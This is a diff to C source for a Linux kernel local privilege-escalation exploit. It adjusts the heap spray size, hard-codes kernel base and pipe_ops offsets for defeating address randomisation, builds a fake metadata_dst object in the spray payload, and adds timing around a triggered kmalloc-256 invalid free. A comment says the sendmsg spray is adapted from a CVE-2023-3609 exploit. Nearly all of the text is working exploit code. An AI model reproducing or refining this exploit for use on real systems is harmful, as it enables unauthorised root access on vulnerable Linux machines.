@@ -152,7 +152,7 @@ void pipe_prefault(Pipe *pipe) {
     CHECK(read(pipe->read_fd, &buf, sizeof(buf)), sizeof(buf));
 }
 
-#define NUM_SPRAY 0x900
+#define NUM_SPRAY 0xa00
 #define SPRAY_SIZE 0x100
 
 // sendmsg spray adapted from CVE-2023-3609 exploit
@@ -364,8 +364,9 @@ void close_fds(int *fd_array, usize len) {
 #define LINEAR_BASE 0xffffff8000000000
 #define PHYS_BASE 0x200000
 
+#define STEXT 0xffffffff81000000
 #define PAGE_OFFSET_BASE 0x676900
-#define PIPE_OPS_OFFSET 0x676900
+#define PIPE_OPS_OFFSET (0xffffffff827bf3c0 - STEXT)
 
 usize vmem_base = 0;
 usize kaslr_base = 0;
@@ -747,7 +748,8 @@ void try_run_main_exploit(TriggerCtx *ctx) {
     // cause rcu to free rt6 info
     sleep(1);
 
-    // TODO: setup payload we want to spray
+    // cannot have + 128 offset, dev overlaps with refcount, and refcnt cannot be null
+    // cannot have one at 196 offset, counter overlaps with sendmsg length, so refcount dec will never free
     struct metadata_dst *dst_entry = (struct metadata_dst *) (payload + 64);
     dst_entry->dst.dev = NULL;
     dst_entry->dst.obsolete = 1;
@@ -758,20 +760,6 @@ void try_run_main_exploit(TriggerCtx *ctx) {
     // just has to not be 0 (METADATA_IP_TUNNEL)
     dst_entry->type = METADATA_HW_PORT_MUX;
 
-    // can still write to 128 with no wraparound, dst_entry is 112 big, metadata_dst is 116
-    // cannot have, dev overlaps with refcount, and refcnt cannot be null
-    // dst_entry = (struct metadata_dst *) (payload + 128);
-    // dst_entry->dst.dev = NULL;
-    // dst_entry->dst.obsolete = 1;
-    // dst_entry->dst.__refcnt.counter = 1;
-    // // blackhole ops
-    // dst_entry->dst.ops = (struct dst_ops *) 0xffffffff836a8e40;
-    // dst_entry->dst.flags = 0xffff;
-    // // just has to not be 0 (METADATA_IP_TUNNEL)
-    // dst_entry->type = METADATA_HW_PORT_MUX;
-
-    // cannot have one at 196 offset, counter overlaps with sendmsg length, so refcount dec will never free
-
     // after spray, dst_cache hopefully reclaimed
     LOG("spray kmalloc-256...");
     do_spray();
@@ -780,6 +768,9 @@ void try_run_main_exploit(TriggerCtx *ctx) {
     LOG("trigger kmalloc-256 invalid free...");
     u8 buf = 0;
     SYSCHK(write(ctx->vuln_socket, &buf, sizeof(buf)));
+
+    // sleep 10 ms
+    usleep(10 * 1000);
 
     // change vuln pipe buffer to put them in kmalloc-256
     // will hopefully cause pipe to fill freed slot in sprayed object
